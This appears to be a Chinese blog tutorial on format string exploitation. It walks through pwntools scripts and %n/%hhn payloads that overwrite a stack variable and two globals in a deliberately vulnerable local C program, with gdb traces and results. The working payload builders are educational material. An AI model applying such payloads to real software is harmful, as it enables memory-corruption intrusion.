+<p>可以发现在0xffffcff4处存储着变量c的数值(789==0x315)。继而，我们再确定格式化字符串’%d%d’的地址0xffffd008相对于printf函数的格式化字符串参数0xffffcff0的偏移为0x18，即格式化字符串地址相当于printf函数的第7个参数(0xffffcfec是printf函数的返回地址)，相当于格式化字符串的第6个参数。</p>
+<h5 id="进行覆盖"><a href="#进行覆盖" class="headerlink" title="进行覆盖"></a>进行覆盖</h5><p>这样，第 6 个参数处的值就是存储变量 c 的地址，我们便可以利用 %n 的特征来修改 c 的值。payload 如下</p>
+<pre><code>[address of c]%012d%6$n</code></pre><p>address of c的长度为4(32位程序)，故而我们得再输入12个字符才可以达到16个字符，以便来修改c的值为16。</p>
+<blockquote>
+<p>参数n,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。前面已经成果输出了16个字符了，所以在这就相当于把格式化字符串的第6个参数c的值改写成了16。</p>
+<p>参数012d：如果width选项前缀以0，则在左侧用0填充直至达到宽度要求。这里把012d换成’a’*12也可以。</p>
+</blockquote>
+<p>具体脚本如下</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">forc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./overwrite'</span><span class="token punctuation">)</span>
+    c_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#原来是printf("%p\n",&amp;c);drop=True表示接收\n之前的值,16表示以16进制的形式。</span>
+    <span class="token keyword">print</span> hex<span class="token punctuation">(</span>c_addr<span class="token punctuation">)</span>
+    payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>c_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'%012d'</span> <span class="token operator">+</span> <span class="token string">'%6$n'</span>
+    <span class="token keyword">print</span> payload
+    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>
+    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+    <span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+forc<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<blockquote>
+<p>我用这个脚本去打我上面编译出来的程序，发现c_addr一直接收不了，因为在printf(“%p\n”,&amp;c);之前有一个scanf()语句，我发现就算是先send()一个数值也接收不到…于是我又用他的脚本编译了一次。</p>
+</blockquote>
+<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">456</span><span class="token punctuation">;</span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">789</span><span class="token punctuation">;</span>
+  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"modified c."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"modified a for a small number."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">==</span> <span class="token number">0x12345678</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"modified b for a big number!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<blockquote>
+<p>关于pwntools里面的recvuntil脚本</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> t <span class="token operator">=</span> tube<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token operator">>></span><span class="token operator">></span> t<span class="token punctuation">.</span>recv_raw <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">:</span> b<span class="token string">"Hello World!"</span>
+<span class="token operator">>></span><span class="token operator">></span> t<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>b<span class="token string">' '</span><span class="token punctuation">)</span>
+b<span class="token string">'Hello '</span>
+<span class="token operator">>></span><span class="token operator">></span> _<span class="token operator">=</span>t<span class="token punctuation">.</span>clean<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+<span class="token operator">>></span><span class="token operator">></span> <span class="token comment" spellcheck="true"># Matches on 'o' in 'Hello'</span>
+<span class="token operator">>></span><span class="token operator">></span> t<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token punctuation">(</span>b<span class="token string">' '</span><span class="token punctuation">,</span>b<span class="token string">'W'</span><span class="token punctuation">,</span>b<span class="token string">'o'</span><span class="token punctuation">,</span>b<span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+b<span class="token string">'Hello'</span>
+<span class="token operator">>></span><span class="token operator">></span> _<span class="token operator">=</span>t<span class="token punctuation">.</span>clean<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+<span class="token operator">>></span><span class="token operator">></span> <span class="token comment" spellcheck="true"># Matches expressly full string</span>
+<span class="token operator">>></span><span class="token operator">></span> t<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>b<span class="token string">' Wor'</span><span class="token punctuation">)</span>
+b<span class="token string">'Hello Wor'</span>
+<span class="token operator">>></span><span class="token operator">></span> _<span class="token operator">=</span>t<span class="token punctuation">.</span>clean<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+<span class="token operator">>></span><span class="token operator">></span> <span class="token comment" spellcheck="true"># Matches on full string, drops match</span>
+<span class="token operator">>></span><span class="token operator">></span> t<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>b<span class="token string">' Wor'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+b<span class="token string">'Hello'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</blockquote>
+<p>结果如下</p>
+<pre class="line-numbers language-shell"><code class="language-shell">devil@ubuntu:~$ python exp.py 
+[+] Starting local process './overflow_1': pid 3817
+0xff9583ac
+[*] running in new terminal: /usr/bin/gdb -q  "./overflow_1" 3817 -x "/tmp/pwnyrtF2W.gdb"
+[+] Waiting for debugger: Done
+\xac\x83\x95\xffaaaaaaaaaaaamodified c.
+
+[*] Switching to interactive mode
+[*] Process './overflow_1' stopped with exit code 0 (pid 3817)
+[*] Got EOF while reading in interactive
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>terminal里面的结果如下</p>
+<pre class="line-numbers language-shell"><code class="language-shell">gef➤  b printf
+Breakpoint 1 at 0xf7deb670: file printf.c, line 28.
+gef➤  c
+Continuing.
+
+Breakpoint 1, __printf (format=0xff958348 "\254\203\225\377", 'a' <repeats 12 times>, "%6$n") at printf.c:28
+28    printf.c: No such file or directory.
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────── registers ────
+$eax   : 0xff958348  →  0xff9583ac  →  0x00000315
+$ebx   : 0x0       
+$ecx   : 0x1       
+$edx   : 0xf7f5587c  →  0x00000000
+$esp   : 0xff95832c  →  0x080484d7  →  <main+76> add esp, 0x10
+$ebp   : 0xff9583b8  →  0x00000000
+$esi   : 0xf7f54000  →  0x001b1db0
+$edi   : 0xf7f54000  →  0x001b1db0
+$eip   : 0xf7deb670  →  <printf+0> call 0xf7ec1b59 <__x86.get_pc_thunk.ax>
+$eflags: [carry parity ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
+───────────────────────────────────────────────────────────────────── stack ────
+0xff95832c│+0x0000: 0x080484d7  →  <main+76> add esp, 0x10     ← $esp
+0xff958330│+0x0004: 0xff958348  →  0xff9583ac  →  0x00000315
+0xff958334│+0x0008: 0xff958348  →  0xff9583ac  →  0x00000315
+0xff958338│+0x000c: 0x000000c2
+0xff95833c│+0x0010: 0xf7e326bb  →  <handle_intel+107> add esp, 0x10
+0xff958340│+0x0014: 0xff95836e  →  0xffff0000
+0xff958344│+0x0018: 0xff95846c  →  0xff95a323  →  "QT_QPA_PLATFORMTHEME=appmenu-qt5"
+0xff958348│+0x001c: 0xff9583ac  →  0x00000315
+─────────────────────────────────────────────────────────────── code:x86:32 ────
+   0xf7deb667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]
+   0xf7deb66d                  nop    
+   0xf7deb66e                  xchg   ax, ax
+ → 0xf7deb670 <printf+0>       call   0xf7ec1b59 <__x86.get_pc_thunk.ax>
+   ↳  0xf7ec1b59 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]
+      0xf7ec1b5c <__x86.get_pc_thunk.ax+3> ret    
+      0xf7ec1b5d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]
+      0xf7ec1b60 <__x86.get_pc_thunk.dx+3> ret    
+      0xf7ec1b61 <__x86.get_pc_thunk.si+0> mov    esi, DWORD PTR [esp]
+      0xf7ec1b64 <__x86.get_pc_thunk.si+3> ret    
+─────────────────────────────────────────────────────── arguments (guessed) ────
+__x86.get_pc_thunk.ax (
+)
+─────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "overflow_1", stopped 0xf7deb670 in __printf (), reason: BREAKPOINT
+───────────────────────────────────────────────────────────────────── trace ────
+[#0] 0xf7deb670 → __printf(format=0xff958348 "\254\203\225\377", 'a' <repeats 12 times>, "%6$n")
+[#1] 0x80484d7 → main()
+────────────────────────────────────────────────────────────────────────────────
+gef➤  c
+Continuing.
+[Inferior 1 (process 3817) exited normally]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>结果输出modified c，说明c的值的确被修改成了16.</p>
+<h4 id="覆盖任意地址内存"><a href="#覆盖任意地址内存" class="headerlink" title="覆盖任意地址内存"></a>覆盖任意地址内存</h4><h5 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h5><p>首先，我们来考虑一下如何修改data段的变量为一个较小的数字，比如说，<strong>小于机器字长的数字</strong>。这里以 2 为例。可能会觉得这其实没有什么区别，可仔细一想，真的没有么？如果我们还是将要覆盖的地址放在最前面，那么将直接占用机器字长个 (4 或 8) 字节。显然，无论之后如何输出，都只会比 4 大。</p>
+<blockquote>
+<p>或许我们可以使用整型溢出来修改对应的地址的值，但是这样将面临着我们得一次输出大量的内容。而这，一般情况下，基本都不会攻击成功。</p>
+</blockquote>
+<p>那么我们应该怎么做呢？再仔细想一下，我们有必要将所要覆盖的变量的地址放在字符串的最前面么？似乎没有，我们当时只是为了寻找偏移，所以才把 tag 放在字符串的最前面，如果我们把 tag 放在中间，其实也是无妨的。类似的，我们把地址放在中间，只要能够找到对应的偏移，其照样也可以得到对应的数值。前面已经说了我们的格式化字符串对应的地址为格式化字符串的第 6 个参数。由于我们想要把 2 写到对应的地址处，故而格式化字符串的前面的字节必须是</p>
+<pre class="line-numbers language-c"><code class="language-c">aa<span class="token operator">%</span>k$nxx    <span class="token comment" spellcheck="true">//'k$'表示获取格式化字符串中的第k个参数，'%n'表示把已经成功输出的字符个数写入对应的整型指针参数所指的变量。这里已经成功输出的字符为'aa'，所以把2写入地址为a_addr处，也就是把a的值覆盖为2.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>此时对应的存储的格式化字符串(%k$nxx)已经占据了6个字符的位置，如果我们再添加两个字符aa，那么其实aa%k就是第6个参数(4个字符为1个参数)，$nxx其实就是第7个参数，后面我们如果跟上我们要覆盖的地址，那就是第8个参数，所以如果我们这里设置k为8，其实就可以覆盖了。</p>
+<p>利用 ida 可以得到 a 的地址为 0x0804A024（由于 a、b 是已初始化的全局变量，因此不在堆栈中）。</p>
+<pre class="line-numbers language-assembly"><code class="language-assembly">.data:0804A024                 public a
+.data:0804A024 a               dd 7Bh                  ; DATA XREF: main:loc_80484F4↑r
+.data:0804A028                 public b
+.data:0804A028 b               dd 1C8h                 ; DATA XREF: main:loc_8048510↑r
+.data:0804A028 _data           ends<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>故而我们可以构造如下的利用代码</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">def</span> <span class="token function">fora</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./overflow_1'</span><span class="token punctuation">)</span>
+    a_addr <span class="token operator">=</span> <span class="token number">0x0804A024</span>
+    payload <span class="token operator">=</span> <span class="token string">'aa%8$naa'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>a_addr<span class="token punctuation">)</span>
+    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+    <span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    
+    sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+fora<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>对应的结果如下</p>
+<pre class="line-numbers language-shell"><code class="language-shell">devil@ubuntu:~$ python test.py 
+[+] Starting local process './overflow_1': pid 5353
+0xff820b7c
+aaaa$\xa0\x04modified a for a small number.
+
+[*] Switching to interactive mode
+[*] Process './overflow_1' stopped with exit code 0 (pid 5353)
+[*] Got EOF while reading in interactive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<blockquote>
+<p>小技巧：我们没有必要必须把地址放在最前面，放在哪里都可以，只要我们可以找到其对应的偏移即可。</p>
+</blockquote>
+<h5 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h5><p>上面介绍了覆盖小数字，接下来介绍一下覆盖大数字。上面我们说了，我们可以选择直接一次性输出大数字个字节来进行覆盖，但是这样基本也不会成功，因为太长了。而且即使成功，我们一次性等待的时间也太长了，那么有没有什么比较好的方式呢？^__^当然有！(不然还写个p的笔记)</p>
+<p>不过在介绍之前，我们得先再简单了解一下，变量在内存中的存储格式。首先，所有的变量在内存中都是以字节进行存储的。此外，在x86和x64的体系结构中，变量的存储格式为小端存储，即最低有效位存储在低地址(和我们通常习惯的顺序相反)。</p>
+<p>举个例子，0x12345678在内存中由低地址到高地址依次为\x78\x56\x34\x12。再者，我们可以回忆一下格式化字符串里面的标志，可以发现有这么两个标志：</p>
+<pre><code>hh    对于整数类型，printf期待一个从char提升的int尺寸的整型参数。输出一个字节
+h    对于整数类型，printf期待一个从short提升的int尺寸的整型参数。输出一个双字节</code></pre><p>所以说，我们可以利用 %hhn 向某个地址写入单字节，利用 %hn 向某个地址写入双字节。这里，我们以单字节为例。</p>
+<p>我们准备覆盖b的值，先用ida看一下b的地址为多少</p>
+<pre class="line-numbers language-shell"><code class="language-shell">.data:0804A028                 public b
+.data:0804A028 b               dd 1C8h                 ; DATA XREF: <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>可以看出，b的地址为0x0804A028</p>
+<p>我们希望将按照如下方式进行覆盖，前面为覆盖地址，后面为覆盖内容。</p>
+<pre><code>0x0804A028 \x78
+0x0804A029 \x56
+0x0804A02a \x34
+0x0804A02b \x12</code></pre><p>我们在前面确定相对偏移的过程中确定了格式化字符串的地址是格式化字符串的第6个参数。所以我们的payload基本上如下</p>
+<pre><code>p32(0x0804A028)+p32(0x0804A029)+p32(0x0804A02a)+p32(0x0804A02b)+pad1+'%6$n'+pad2+'%7$n'+pad3'%8$n'+pad4'%9$n'</code></pre><p>给出一个基本构造如下：</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">def</span> <span class="token function">fmt</span><span class="token punctuation">(</span>prev<span class="token punctuation">,</span>word<span class="token punctuation">,</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> prev <span class="token operator">&lt;</span> word<span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#传过来的word依次为0x78,0x56,0x34,0x12;传过来的prev依次为4,0x78,0x56,0x34</span>
+        result <span class="token operator">=</span> word <span class="token operator">-</span> prev
+        fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>
+    <span class="token keyword">elif</span> prev <span class="token operator">==</span> word<span class="token punctuation">:</span>
+        result <span class="token operator">=</span> <span class="token number">0</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        result <span class="token operator">=</span> <span class="token number">256</span> <span class="token operator">+</span> word <span class="token operator">-</span> prev
+        fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>
+    fmtstr <span class="token operator">+=</span> <span class="token string">"%"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"$hhn"</span>     
+    <span class="token keyword">print</span><span class="token punctuation">(</span>fmtstr<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> fmtstr
+
+<span class="token keyword">def</span> <span class="token function">fmt_str</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span>size<span class="token punctuation">,</span>addr<span class="token punctuation">,</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    payload <span class="token operator">=</span> <span class="token string">""</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> size <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>
+            payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>
+    prev <span class="token operator">=</span> len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        payload <span class="token operator">+=</span> fmt<span class="token punctuation">(</span>prev<span class="token punctuation">,</span><span class="token punctuation">(</span>target <span class="token operator">>></span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">,</span>offset <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#乘法运算优先级高于左移运算，右移8位是二进制的8位，转成16进制之后就是每次右移两位。'&amp;0xff'目的是除了最右边两位不变，其它位都置零。</span>
+        prev <span class="token operator">=</span> <span class="token punctuation">(</span>target <span class="token operator">>></span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>    <span class="token comment" spellcheck="true">#prev的初值为4,之后依次为0x78,0x56,0x34,0x12</span>
+    <span class="token keyword">return</span> payload    
+
+payload <span class="token operator">=</span> fmt_str<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x0804A028</span><span class="token punctuation">,</span><span class="token number">0x12345678</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>其中每个参数的含义基本如下</p>
+<ul>
+<li>offset表示要覆盖的地址的最初的偏移</li>
+<li>size表示机器字长</li>
+<li>addr表示将要覆盖的地址</li>
+<li>target表示我们要覆盖为的目的变量值</li>
+</ul>
+<p>说实话一开始没太看懂这个payload的构造，于是我一步步分析了程序并先打印了这个fmt()函数的运行结果</p>
+<blockquote>
+<p>python运算中，乘法优先级在右移优先级之前。</p>
+<p>pre1 = (0x12345678) &gt;&gt; 0 * 8</p>
+<p>pre1 –&gt; 0x12345678</p>
+<p>pre2 = pre1 &amp; 0xff</p>
+<p>pre2 –&gt;0x78</p>
+</blockquote>
+<blockquote>
+<p>fmt函数运行结果如下</p>
+<p>%104c%6$hhn<br>%222c%7$hhn<br>%222c%8$hhn<br>%222c%9$hhn</p>
+<p>payload结果如下</p>
+<p>(\xa0\x04)\xa0\x04*\xa0\x04+\xa0\x04%104c%6$hhn%222c%7$hhn%222c%8$hhn%222c%9$hhn</p>
+<p>payload前面一段是p32形式的攻击地址 后面%(num)c%(index)$hhn表示向第index个参数处以单字节的形式写入特定数值[0x78,0x56,0x34,0x12]</p>
+</blockquote>
+<p>完整的exploit如下</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#-*- coding=utf-8 -*-</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">def</span> <span class="token function">fmt</span><span class="token punctuation">(</span>prev<span class="token punctuation">,</span>word<span class="token punctuation">,</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> prev <span class="token operator">&lt;</span> word<span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#传过来的word依次为0x78,0x56,0x34,0x12;传过来的prev依次为0x10,0x78,0x56,0x34</span>
+        result <span class="token operator">=</span> word <span class="token operator">-</span> prev
+        fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>
+    <span class="token keyword">elif</span> prev <span class="token operator">==</span> word<span class="token punctuation">:</span>
+        result <span class="token operator">=</span> <span class="token number">0</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+         result <span class="token operator">=</span> <span class="token number">256</span> <span class="token operator">+</span> word <span class="token operator">-</span> prev
+         fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>
+    fmtstr <span class="token operator">+=</span> <span class="token string">"%"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"$hhn"</span>     
+    <span class="token keyword">print</span><span class="token punctuation">(</span>fmtstr<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> fmtstr
+
+<span class="token keyword">def</span> <span class="token function">fmt_str</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span>size<span class="token punctuation">,</span>addr<span class="token punctuation">,</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    payload <span class="token operator">=</span> <span class="token string">""</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> size <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>
+            payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>
+    prev <span class="token operator">=</span> len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        payload <span class="token operator">+=</span> fmt<span class="token punctuation">(</span>prev<span class="token punctuation">,</span><span class="token punctuation">(</span>target <span class="token operator">>></span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">,</span>offset <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#乘法运算优先级高于左移运算，右移8位是二进制的8位，转成16进制之后就是每次右移两位。'&amp;0xff'目的是除了最右边两位不变，其它位都置零。</span>
+        prev <span class="token operator">=</span> <span class="token punctuation">(</span>target <span class="token operator">>></span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span> <span class="token comment" spellcheck="true">#prev的初值为4,之后依次为0x78,0x56,0x34,0x12</span>
+    <span class="token keyword">return</span> payload    
+
+<span class="token keyword">def</span> <span class="token function">proc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./overflow_1"</span><span class="token punctuation">)</span>
+    payload <span class="token operator">=</span> fmt_str<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x0804A028</span><span class="token punctuation">,</span><span class="token number">0x12345678</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+proc<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>结果如下</p>
+<pre class="line-numbers language-shell"><code class="language-shell">devil@ubuntu:~$ python exploit.py 
+[+] Starting local process './overflow_1': pid 2780
+%104c%6$hhn
+%222c%7$hhn
+%222c%8$hhn
+%222c%9$hhn
+(\xa0\x04)\xa0\x04*\xa0\x04+\xa0\x04%104c%6$hhn%222c%7$hhn%222c%8$hhn%222c%9$hhn
